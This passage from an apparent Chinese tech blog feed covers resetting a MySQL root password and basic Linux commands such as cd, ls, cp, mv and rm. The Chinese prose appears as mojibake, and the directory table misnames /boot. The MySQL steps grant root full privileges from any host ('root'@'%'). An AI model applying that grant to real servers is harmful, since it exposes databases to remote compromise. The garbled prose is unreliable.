ï¼ˆè·³è¿‡æ£€æŸ¥ï¼‰ï¼Œç„¶åæŒ‰escã€ZZé€€å‡ºã€‚</p><h4 id="2ã€é‡å¯MySQLæœåŠ¡ï¼š"><a href="#2ã€é‡å¯MySQLæœåŠ¡ï¼š" class="headerlink" title="2ã€é‡å¯MySQLæœåŠ¡ï¼š"></a>2ã€é‡å¯MySQLæœåŠ¡ï¼š</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3ã€ä¿®æ”¹å¯†ç "><a href="#3ã€ä¿®æ”¹å¯†ç " class="headerlink" title="3ã€ä¿®æ”¹å¯†ç "></a>3ã€ä¿®æ”¹å¯†ç </h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('ä½ çš„å¯†ç ');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯èƒ½ä¼šå‡ºç°  ERROR 1290 (HY000): The MySQL server is running with the â€“skip-grant-tables option so it cannot execute this statement  çš„æŠ¥é”™ï¼Œè¾“å…¥ ï¼šflush privileges;</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4ã€å†æ¬¡é‡æ–°è®¾ç½®å¯†ç "><a href="#4ã€å†æ¬¡é‡æ–°è®¾ç½®å¯†ç " class="headerlink" title="4ã€å†æ¬¡é‡æ–°è®¾ç½®å¯†ç "></a>4ã€å†æ¬¡é‡æ–°è®¾ç½®å¯†ç </h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for 'root'@'localhost'=password('ä½ çš„å¯†ç ');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5ã€é‡è®¾è¿œç¨‹è®¿é—®"><a href="#5ã€é‡è®¾è¿œç¨‹è®¿é—®" class="headerlink" title="5ã€é‡è®¾è¿œç¨‹è®¿é—®"></a>5ã€é‡è®¾è¿œç¨‹è®¿é—®</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'ä½ çš„å¯†ç ' WITH GRANT OPTION;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6ã€æŠŠskip-grant-tablesåˆ é™¤"><a href="#6ã€æŠŠskip-grant-tablesåˆ é™¤" class="headerlink" title="6ã€æŠŠskip-grant-tablesåˆ é™¤"></a>6ã€æŠŠskip-grant-tablesåˆ é™¤</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7ã€é‡å¯MySQL"><a href="#7ã€é‡å¯MySQL" class="headerlink" title="7ã€é‡å¯MySQL"></a>7ã€é‡å¯MySQL</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹‹åå°±å¯ä»¥æ­£å¸¸ç™»é™†äº†~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214197.png" style="zoom:150%;"><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202201161214199.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="è¿ç»´" scheme="https://huhu-myh.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬äºŒç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10005.html"/>
    <id>https://huhu-myh.github.io/posts/myh10005.html</id>
    <published>2022-01-15T09:28:46.000Z</published>
    <updated>2022-02-06T11:56:18.817Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬äºŒç« ï¼šåŸºæœ¬çš„-bash-shell-å‘½ä»¤"><a href="#ç¬¬äºŒç« ï¼šåŸºæœ¬çš„-bash-shell-å‘½ä»¤" class="headerlink" title="ç¬¬äºŒç« ï¼šåŸºæœ¬çš„ bash shell å‘½ä»¤"></a>ç¬¬äºŒç« ï¼šåŸºæœ¬çš„ bash shell å‘½ä»¤</h2><h3 id="2-1æµè§ˆæ–‡ä»¶ç³»ç»Ÿ"><a href="#2-1æµè§ˆæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="2.1æµè§ˆæ–‡ä»¶ç³»ç»Ÿ"></a>2.1æµè§ˆæ–‡ä»¶ç³»ç»Ÿ</h3><h4 id="2-1-1-Linuxæ–‡ä»¶ç³»ç»Ÿ"><a href="#2-1-1-Linuxæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="2.1.1 Linuxæ–‡ä»¶ç³»ç»Ÿ"></a>2.1.1 Linuxæ–‡ä»¶ç³»ç»Ÿ</h4><p>Linuxä¸åŒäºWIndowsï¼Œåœ¨è·¯å¾„åä¸­ä¸ä½¿ç”¨é©±åŠ¨å™¨ç›˜ç¬¦ã€‚  </p><p>Linuxå°†æ–‡ä»¶å­˜å‚¨åœ¨<font color="#FF5E2A" size="4"><strong>å•ä¸ªç›®å½•ç»“æ„</strong></font>ä¸­ï¼Œè¿™ä¸ªç›®å½•è¢«ç§°ä¸º<font color="#FF5E2A" size="4"><strong>è™šæ‹Ÿç›®å½•ï¼ˆ virtual directoryï¼‰</strong></font>ã€‚è™šæ‹Ÿç›®å½•å°†å®‰è£…åœ¨PCä¸Šçš„æ‰€æœ‰å­˜å‚¨è®¾å¤‡çš„æ–‡ä»¶è·¯å¾„çº³å…¥å•ä¸ªç›®å½•ç»“æ„ä¸­ã€‚Linuxè™šæ‹Ÿç›®å½•ç»“æ„<strong>åªåŒ…å«ä¸€ä¸ªç§°ä¸º<font color="#FF5E2A" size="4">æ ¹ï¼ˆ rootï¼‰ç›®å½•</font>çš„åŸºç¡€ç›®å½•</strong>ã€‚æ ¹ç›®å½•ä¸‹çš„ç›®å½•å’Œæ–‡ä»¶ä¼šæŒ‰ç…§è®¿é—®å®ƒä»¬çš„ç›®å½•è·¯å¾„ä¸€ä¸€åˆ—å‡ºï¼Œè¿™ç‚¹è·ŸWindowsç±»ä¼¼ã€‚  </p><p>åœ¨Linux PCä¸Šå®‰è£…çš„<strong>ç¬¬ä¸€å—ç¡¬ç›˜</strong>ç§°ä¸ºæ ¹é©±åŠ¨å™¨ã€‚<strong>æ ¹é©±åŠ¨å™¨åŒ…å«äº†è™šæ‹Ÿç›®å½•çš„æ ¸å¿ƒ</strong>ï¼Œå…¶ä»–ç›®å½•éƒ½æ˜¯ä»é‚£é‡Œå¼€å§‹æ„å»ºçš„ã€‚Linuxä¼šåœ¨æ ¹é©±åŠ¨å™¨ä¸Šåˆ›å»ºä¸€äº›ç‰¹åˆ«çš„ç›®å½•ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>æŒ‚è½½ç‚¹ï¼ˆ mount pointï¼‰</strong>ã€‚<font color="#FF5E2A" size="4">æŒ‚è½½ç‚¹æ˜¯è™šæ‹Ÿç›®å½•ä¸­ç”¨äºåˆ†é…é¢å¤–å­˜å‚¨è®¾å¤‡çš„ç›®å½•</font>ã€‚è™šæ‹Ÿç›®å½•ä¼šè®©æ–‡ä»¶å’Œç›®å½•å‡ºç°åœ¨è¿™äº›æŒ‚è½½ç‚¹ç›®å½•ä¸­ï¼Œç„¶è€Œ<strong>å®é™…ä¸Šå®ƒä»¬å´å­˜å‚¨åœ¨å¦å¤–ä¸€ä¸ªé©±åŠ¨å™¨</strong>ä¸­ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635094.png"></p><p>å¦‚å›¾Disk1ç¡¬ç›˜å’Œè™šæ‹Ÿç›®å½•çš„æ ¹ç›®å½•å…³è”èµ·æ¥ã€‚Disk2ç¡¬ç›˜å°±å¯ä»¥æŒ‚è½½åˆ°è™šæ‹Ÿç›®å½•ç»“æ„ä¸­çš„ä»»ä½•åœ°æ–¹ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬äºŒå—ç¡¬ç›˜è¢«æŒ‚è½½åˆ°äº†/homeä½ç½®ï¼Œhomeè¿™ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªæŒ‚è½½ç‚¹ï¼Œç”¨æˆ·ç›®å½•éƒ½ä½äºè¿™ä¸ªä½ç½®ã€‚</p><p>â€‹                                                                                        <strong>å¸¸è§çš„Linuxç›®å½•åç§°</strong></p><table><thead><tr><th align="center"><strong>/</strong></th><th align="center">è™šæ‹Ÿç›®å½•çš„æ ¹ç›®å½•ã€‚é€šå¸¸ä¸ä¼šåœ¨è¿™é‡Œå­˜å‚¨æ–‡ä»¶</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">äºŒè¿›åˆ¶ç›®å½•ï¼Œå­˜æ”¾è®¸å¤šç”¨æˆ·çº§çš„GNUå·¥å…·</td></tr><tr><td align="center">/bot</td><td align="center">å¯åŠ¨ç›®å½•ï¼Œå­˜æ”¾å¯åŠ¨æ–‡ä»¶</td></tr><tr><td align="center">/dev</td><td align="center">è®¾å¤‡ç›®å½•ï¼Œ Linuxåœ¨è¿™é‡Œåˆ›å»ºè®¾å¤‡èŠ‚ç‚¹</td></tr><tr><td align="center"><strong>/etc</strong></td><td align="center"><strong>ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•</strong></td></tr><tr><td align="center"><strong>/home</strong></td><td align="center">ä¸»ç›®å½•ï¼Œ Linuxåœ¨è¿™é‡Œåˆ›å»º<strong>ç”¨æˆ·ç›®å½•</strong></td></tr><tr><td align="center">/lib</td><td align="center">åº“ç›®å½•ï¼Œå­˜æ”¾ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„åº“æ–‡ä»¶</td></tr><tr><td align="center">/media</td><td align="center">åª’ä½“ç›®å½•ï¼Œå¯ç§»åŠ¨åª’ä½“è®¾å¤‡çš„å¸¸ç”¨<strong>æŒ‚è½½ç‚¹</strong></td></tr><tr><td align="center">/mnt</td><td align="center">æŒ‚è½½ç›®å½•ï¼Œå¦ä¸€ä¸ªå¯ç§»åŠ¨åª’ä½“è®¾å¤‡çš„å¸¸ç”¨æŒ‚è½½ç‚¹</td></tr><tr><td align="center">/opt</td><td align="center">å¯é€‰ç›®å½•ï¼Œå¸¸ç”¨äºå­˜æ”¾<strong>ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…å’Œæ•°æ®æ–‡ä»¶</strong></td></tr><tr><td align="center"><strong>/proc</strong></td><td align="center">è¿›ç¨‹ç›®å½•ï¼Œå­˜æ”¾ç°æœ‰ç¡¬ä»¶åŠå½“å‰<strong>è¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯</strong></td></tr><tr><td align="center"><strong>/root</strong></td><td align="center"><strong>rootç”¨æˆ·çš„ä¸»ç›®å½•</strong></td></tr><tr><td align="center">/sbin</td><td align="center">ç³»ç»ŸäºŒè¿›åˆ¶ç›®å½•ï¼Œå­˜æ”¾è®¸å¤šGNUç®¡ç†å‘˜çº§å·¥å…·</td></tr><tr><td align="center">/run</td><td align="center">è¿è¡Œç›®å½•ï¼Œå­˜æ”¾ç³»ç»Ÿè¿ä½œæ—¶çš„è¿è¡Œæ—¶æ•°æ®</td></tr><tr><td align="center">/srv</td><td align="center">æœåŠ¡ç›®å½•ï¼Œå­˜æ”¾æœ¬åœ°æœåŠ¡çš„ç›¸å…³æ–‡ä»¶</td></tr><tr><td align="center">/sys</td><td align="center">ç³»ç»Ÿç›®å½•ï¼Œå­˜æ”¾ç³»ç»Ÿç¡¬ä»¶ä¿¡æ¯çš„ç›¸å…³æ–‡ä»¶</td></tr><tr><td align="center"><strong>/tmp</strong></td><td align="center">ä¸´æ—¶ç›®å½•ï¼Œ<strong>å¯ä»¥åœ¨è¯¥ç›®å½•ä¸­åˆ›å»ºå’Œåˆ é™¤ä¸´æ—¶å·¥ä½œæ–‡ä»¶</strong></td></tr><tr><td align="center">/usr</td><td align="center">ç”¨æˆ·äºŒè¿›åˆ¶ç›®å½•ï¼Œå¤§é‡ç”¨æˆ·çº§çš„GNUå·¥å…·å’Œæ•°æ®æ–‡ä»¶éƒ½å­˜å‚¨åœ¨è¿™é‡Œ</td></tr><tr><td align="center"><strong>/var</strong></td><td align="center">å¯å˜ç›®å½•ï¼Œç”¨ä»¥å­˜æ”¾ç»å¸¸å˜åŒ–çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<strong>æ—¥å¿—æ–‡ä»¶</strong></td></tr></tbody></table><h4 id="2-1-2-éå†ç›®å½•"><a href="#2-1-2-éå†ç›®å½•" class="headerlink" title="2.1.2 éå†ç›®å½•"></a>2.1.2 éå†ç›®å½•</h4><p>åœ¨Linuxæ–‡ä»¶ç³»ç»Ÿä¸Šï¼Œå¯ä»¥ä½¿ç”¨<font color="#FF5E2A" size="2">åˆ‡æ¢ç›®å½•å‘½ä»¤cdå°†shellä¼šè¯åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç›®å½•</font>ã€‚ cdå‘½ä»¤çš„æ ¼å¼éå¸¸ç®€å•ï¼š<strong>cd destination</strong><br>cdå‘½ä»¤å¯æ¥å—å•ä¸ªå‚æ•°destinationï¼Œç”¨ä»¥æŒ‡å®šæƒ³åˆ‡æ¢åˆ°çš„ç›®å½•åã€‚<strong>å¦‚æœæ²¡æœ‰ä¸ºcdå‘½ä»¤æŒ‡å®šç›®æ ‡è·¯å¾„ï¼Œå®ƒå°†åˆ‡æ¢åˆ°ç”¨æˆ·ä¸»ç›®å½•ã€‚</strong><br>destinationå‚æ•°å¯ä»¥ç”¨ä¸¤ç§æ–¹å¼è¡¨ç¤ºï¼šä¸€ç§æ˜¯ä½¿ç”¨<strong>ç»å¯¹æ–‡ä»¶è·¯å¾„</strong>ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨<strong>ç›¸å¯¹æ–‡ä»¶è·¯å¾„</strong>ã€‚</p><p><strong>1.ç»å¯¹æ–‡ä»¶è·¯å¾„</strong></p><p>â€‹            <font color="#FF5E2A" size="2">å¯¹æ–‡ä»¶è·¯å¾„æ€»æ˜¯ä»¥æ­£æ–œçº¿ï¼ˆ /ï¼‰ä½œä¸ºèµ·å§‹ï¼ŒæŒ‡æ˜è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚</font>  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928215.png" style="zoom:200%;"><p>å¦‚å›¾åˆšå¼€å§‹æ˜¯åœ¨/rootç›®å½•ä¸­ï¼Œå¦‚æœåˆ‡æ¢åˆ°usr/binç›®å½•ä¸­ï¼Œå°±ç›´æ¥ä½¿ç”¨ cd /usr/binï¼Œï¼ˆä¸€å®šæœ€å¼€å§‹æ˜¯æ ¹ç›®å½•ï¼ï¼‰</p><p>è¿™é‡Œçš„ <strong>pwd æ˜¯æ˜¾ç¤ºå½“å‰æ‰€åœ¨çš„ä½ç½®</strong>çš„å‘½ä»¤ã€‚</p><p><strong>2.ç›¸å¯¹æ–‡ä»¶è·¯å¾„</strong></p><p>å°±æ˜¯åŸºäºä½ ç›®å‰æ‰€åœ¨çš„ç›®å½•è¿›è¡Œç›¸å¯¹çš„ç§»åŠ¨ã€‚</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928216.png" style="zoom:150%;"><p>å¦‚å›¾ï¼Œåˆšå¼€å§‹åœ¨usrç›®å½•ä¸­ï¼Œè¦è¿›å…¥usrçš„libç›®å½•ä¸­ï¼Œåˆ™å¯ä»¥ç›´æ¥ cd lib ã€‚ï¼ˆls æ˜¯æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼Œåé¢ä¼šè®²ã€‚ï¼‰</p><p>æœ‰ä¸¤ä¸ªç‰¹æ®Šå­—ç¬¦å¯ç”¨äºç›¸å¯¹æ–‡ä»¶è·¯å¾„ä¸­ï¼š</p><ul><li> <strong>å•ç‚¹ç¬¦ï¼ˆ .ï¼‰</strong>ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ï¼›</li><li> <strong>åŒç‚¹ç¬¦ï¼ˆ ..ï¼‰</strong>ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•çš„çˆ¶ç›®å½•ã€‚</li></ul><p>é‡ç‚¹å°±æ˜¯åŒç‚¹ç¬¦ï¼Œå¯ä»¥è¾ƒä¸ºæ–¹ä¾¿çš„åœ¨ç›¸å¯¹æ–‡ä»¶è·¯å¾„ä¸­ä½¿ç”¨ï¼š</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928217.png" style="zoom:150%;"><h3 id="2-2-æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨"><a href="#2-2-æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨" class="headerlink" title="2.2 æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨"></a>2.2 æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨</h3><h4 id="2-2-1-åŸºæœ¬åˆ—è¡¨åŠŸèƒ½"><a href="#2-2-1-åŸºæœ¬åˆ—è¡¨åŠŸèƒ½" class="headerlink" title="2.2.1 åŸºæœ¬åˆ—è¡¨åŠŸèƒ½"></a>2.2.1 åŸºæœ¬åˆ—è¡¨åŠŸèƒ½</h4><p><strong><code>ls [path]</code> - åˆ—å‡ºæ–‡ä»¶</strong></p><p>è¯¥ç¨‹åº<code>ls</code>å…è®¸æ‚¨åˆ—å‡º<strong>ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå…¶å­ç›®å½•</strong>ã€‚å®ƒå¯ä»¥ä¼ é€’è®¸å¤šä¸åŒçš„å‚æ•°ï¼ˆæˆ–â€œæ ‡å¿—â€ï¼‰æ¥æ§åˆ¶è¾“å‡ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635096.png"></p><p><strong><code>ls -F</code></strong>  å¸¦-Få‚æ•°çš„lså‘½ä»¤<strong>è½»æ¾åŒºåˆ†æ–‡ä»¶å’Œç›®å½•</strong>  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635097.png"></p><p>Linuxç»å¸¸<strong>é‡‡ç”¨éšè—æ–‡ä»¶æ¥ä¿å­˜é…ç½®ä¿¡æ¯</strong>ã€‚åœ¨Linuxä¸Šï¼Œéšè—æ–‡ä»¶é€šå¸¸æ˜¯<strong>æ–‡ä»¶åä»¥ç‚¹å·å¼€å§‹</strong>çš„æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶å¹¶<strong>æ²¡æœ‰</strong>åœ¨é»˜è®¤çš„lså‘½ä»¤è¾“å‡ºä¸­æ˜¾ç¤ºå‡ºæ¥ï¼Œå› æ­¤æˆ‘ä»¬ç§°å…¶ä¸º<font color="#FF5E3A" size="3">éšè—æ–‡ä»¶</font>ã€‚  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635098.png"></p><p>lsæ”¯æŒé€‰é¡¹åˆå¹¶å¦‚ï¼š<code>ls -Fa</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635100.png"></p><p><strong><code>ls -l</code> æ˜¾ç¤ºé™„åŠ ä¿¡æ¯ï¼Œé•¿åˆ—è¡¨è¾“å‡º</strong></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635101.png" style="zoom:150%;"><ul><li><p> æ–‡ä»¶ç±»å‹ï¼Œæ¯”å¦‚ç›®å½•ï¼ˆ dï¼‰ã€æ–‡ä»¶ï¼ˆ -ï¼‰ã€å­—ç¬¦å‹æ–‡ä»¶ï¼ˆ cï¼‰æˆ–å—è®¾å¤‡ï¼ˆ bï¼‰ï¼›</p></li><li><p> æ–‡ä»¶çš„æƒé™ï¼›</p></li><li><p>æ–‡ä»¶çš„ç¡¬é“¾æ¥æ€»æ•°ï¼›</p></li><li><p> æ–‡ä»¶å±ä¸»çš„ç”¨æˆ·åï¼›</p></li><li><p> æ–‡ä»¶å±ç»„çš„ç»„åï¼›</p></li><li><p> æ–‡ä»¶çš„å¤§å°ï¼ˆä»¥<strong>å­—èŠ‚</strong>ä¸ºå•ä½ï¼‰ï¼›</p></li><li><p> æ–‡ä»¶çš„ä¸Šæ¬¡<strong>ä¿®æ”¹æ—¶é—´</strong>ï¼›</p></li><li><p> æ–‡ä»¶åæˆ–ç›®å½•åã€‚  </p></li></ul><h4 id="2-2-2-è¿‡æ»¤è¾“å‡ºåˆ—è¡¨"><a href="#2-2-2-è¿‡æ»¤è¾“å‡ºåˆ—è¡¨" class="headerlink" title="2.2.2 è¿‡æ»¤è¾“å‡ºåˆ—è¡¨"></a>2.2.2 è¿‡æ»¤è¾“å‡ºåˆ—è¡¨</h4><p>å½“è¦è¾“å‡ºæŒ‡å®šæ–‡ä»¶æˆ–è€…æŒ‡å®šå¼€å¤´ç­‰çš„æ–‡ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿‡æ»¤æŸ¥è¯¢ï¼š<code>ls -l x</code> ï¼Œè¿‡æ»¤å™¨å°±æ˜¯ä¸€ä¸ªè¿›è¡Œç®€å•æ–‡æœ¬åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚å¯ä»¥åœ¨è¦ç”¨çš„å‘½ä»¤è¡Œå‚æ•°ä¹‹åæ·»åŠ è¿™ä¸ªè¿‡æ»¤å™¨  ã€‚<strong>åŒæ—¶æ”¯æŒé€šé…ç¬¦åŒ¹é…</strong>ã€‚</p><ul><li><p> é—®å·ï¼ˆ ?ï¼‰ä»£è¡¨<strong>ä¸€ä¸ª</strong>å­—ç¬¦ï¼›</p></li><li><p> æ˜Ÿå·ï¼ˆ *ï¼‰ä»£è¡¨<strong>é›¶ä¸ªæˆ–å¤šä¸ª</strong>å­—ç¬¦ã€‚  </p></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635102.png" style="zoom:150%;"><h4 id="2-2-3-tree"><a href="#2-2-3-tree" class="headerlink" title="2.2.3 tree"></a>2.2.3 tree</h4><p>è¿˜æœ‰ä¸€ä¸ªéå†æ–‡ä»¶åŠŸèƒ½æŒ‡ä»¤tree,èƒ½è¾ƒå¥½åœ°å±•ç¤ºæ–‡ä»¶ä¹‹é—´çš„å±‚çº§ç»“æ„ï¼Œå°†æœ¬ç›®å½•ä¸­çš„æ–‡ä»¶ã€å­ç›®å½•ã€å­ç›®å½•ä¸­çš„æ–‡ä»¶éƒ½ä»¥æ ‘å½¢å±•ç¤ºå‡ºæ¥ï¼šï¼ˆDebian ç‰ˆæœ¬æ²¡æœ‰è¿™ä¸ªæŒ‡ä»¤ï¼Œå¯ä»¥<code>apt-get tree</code>å®‰è£…ï¼‰ï¼Œä¸è¦å°è¯•<code>tree /</code>,é™¤éä½ è§‰ç€å¾ˆç‚«é…·hhhh</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635103.png"></p><h3 id="2-3-å¤„ç†æ–‡ä»¶"><a href="#2-3-å¤„ç†æ–‡ä»¶" class="headerlink" title="2.3 å¤„ç†æ–‡ä»¶"></a>2.3 å¤„ç†æ–‡ä»¶</h3><h4 id="2-3-1-åˆ›å»ºæ–‡ä»¶"><a href="#2-3-1-åˆ›å»ºæ–‡ä»¶" class="headerlink" title="2.3.1 åˆ›å»ºæ–‡ä»¶"></a>2.3.1 åˆ›å»ºæ–‡ä»¶</h4><p><strong>touch</strong>å‘½ä»¤è½»æ¾åˆ›å»º<strong>ç©ºæ–‡ä»¶</strong>ï¼ˆ<strong>æ³¨æ„æ˜¯ç©ºæ–‡ä»¶ï¼Œä¸ä»£è¡¨å¯ä»¥æ˜¯ç©ºç›®å½•å“¦</strong>ï¼‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> test_one<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635104.png" style="zoom:150%;"><h4 id="2-3-2-å¤åˆ¶æ–‡ä»¶"><a href="#2-3-2-å¤åˆ¶æ–‡ä»¶" class="headerlink" title="2.3.2 å¤åˆ¶æ–‡ä»¶"></a>2.3.2 å¤åˆ¶æ–‡ä»¶</h4><p><strong>cp</strong>å‘½ä»¤å°†æ–‡ä»¶æˆ–ç›®å½•ä»ä¸€ä¸ªä½ç½®å¤åˆ¶åˆ°å¦ä¸€ä¸ªä½ç½®  ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> <span class="token operator">&lt;</span>source<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>destination<span class="token operator">&gt;</span> - å¤åˆ¶æ–‡ä»¶-ié€‰é¡¹ï¼Œå¼ºåˆ¶shellè¯¢é—®æ˜¯å¦éœ€è¦è¦†ç›–å·²æœ‰æ–‡ä»¶ã€‚-Rå‚æ•°ï¼Œå¯ä»¥ç”¨å®ƒåœ¨ä¸€æ¡å‘½ä»¤ä¸­é€’å½’åœ°å¤åˆ¶æ•´ä¸ªç›®å½•çš„å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635105.png"></p><p>å¯ä»¥çœ‹åˆ°åŠ ä¸Š -i é€‰é¡¹ï¼Œå°±ä¼šå¼ºåˆ¶è¯¢é—®æ˜¯å¦è¦†ç›–ï¼Œ<strong>æœ€å¥½æ¯æ¬¡éƒ½å¸¦ä¸Š</strong>ï¼Œå†™ yes/no å°±å¯ã€‚å¯ä»¥çœ‹åˆ°ä¿®æ”¹æ—¶é—´æ²¡å˜ã€‚</p><p>cpå‘½ä»¤çš„-<strong>Rå‚æ•°</strong>ã€‚å¯ä»¥ç”¨å®ƒåœ¨ä¸€æ¡å‘½ä»¤ä¸­<strong>é€’å½’åœ°å¤åˆ¶æ•´ä¸ªç›®å½•çš„å†…å®¹</strong>ã€‚  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635106.png" style="zoom:150%;"><h4 id="2-3-3-ç§»åŠ¨å’Œé‡å‘½åæ–‡ä»¶"><a href="#2-3-3-ç§»åŠ¨å’Œé‡å‘½åæ–‡ä»¶" class="headerlink" title="2.3.3 ç§»åŠ¨å’Œé‡å‘½åæ–‡ä»¶"></a>2.3.3 ç§»åŠ¨å’Œé‡å‘½åæ–‡ä»¶</h4><p>åœ¨Linuxä¸­ï¼Œ<strong>é‡å‘½åæ–‡ä»¶ç§°ä¸ºç§»åŠ¨ï¼ˆ movingï¼‰</strong> ã€‚ mvå‘½ä»¤å¯ä»¥å°†æ–‡ä»¶å’Œç›®å½•ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®æˆ–é‡æ–°å‘½åã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Moving a file "into" another file is how you rename files</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file test_file1</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -F</span>test2/testdir/  test_file1  test_file2<span class="token comment"># Move file into directory</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file1 testdir/</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>â”œâ”€â”€ test2â”‚   â”œâ”€â”€ test_fileâ”‚   â””â”€â”€ test_file2â”œâ”€â”€ testdirâ”‚   â””â”€â”€ test_file1â””â”€â”€ test_file2<span class="token number">2</span> directories, <span class="token number">4</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-4-åˆ é™¤æ–‡ä»¶"><a href="#2-3-4-åˆ é™¤æ–‡ä»¶" class="headerlink" title="2.3.4 åˆ é™¤æ–‡ä»¶"></a>2.3.4 åˆ é™¤æ–‡ä»¶</h4><p>åœ¨Linuxä¸­ï¼Œåˆ é™¤ï¼ˆ deletingï¼‰å«ä½œç§»é™¤ï¼ˆ removingï¼‰ ã€‚ bash shellä¸­åˆ é™¤æ–‡ä»¶çš„å‘½ä»¤æ˜¯ <strong>rm</strong>ã€‚  -+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">`</span><span class="token function">rm</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span><span class="token variable">`</span></span> - æ°¸ä¹…åˆ é™¤æ–‡ä»¶-iå‘½ä»¤å‚æ•°æç¤ºä½ æ˜¯ä¸æ˜¯è¦çœŸçš„åˆ é™¤è¯¥æ–‡ä»¶-rå‚æ•°åˆ é™¤ç›®å½•<span 